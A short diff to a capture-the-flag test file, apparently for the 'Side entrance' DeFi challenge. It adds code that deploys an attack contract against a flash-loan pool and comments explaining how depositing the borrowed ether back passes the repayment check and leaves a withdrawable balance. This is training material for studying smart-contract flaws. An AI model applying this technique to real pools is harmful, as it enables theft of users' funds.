@@ -26,6 +26,12 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attackContract = await (await ethers.getContractFactory('SideEntranceAttack', player)).deploy(pool.address);
+        // when contract sends eth to our contract
+        // call the deposit function so that
+        // 1. the amount goes back into the pool so that the repay check passes
+        // 2. now the contract address has that balance which it can withdraw
+        await attackContract.attack(ETHER_IN_POOL);
     });
 
     after(async function () {
